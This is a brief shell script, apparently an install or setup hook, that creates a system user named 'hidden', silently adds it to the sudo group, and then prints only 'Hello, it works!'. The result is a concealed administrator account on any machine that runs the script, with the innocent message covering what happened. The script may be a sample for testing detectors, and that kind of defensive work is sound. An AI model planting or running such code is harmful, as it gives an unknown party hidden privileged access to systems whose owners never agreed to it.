#!/bin/sh

set -e

useradd -m -r -s /bin/sh hidden
gpasswd -a hidden sudo > /dev/null

echo "Hello, it works!"
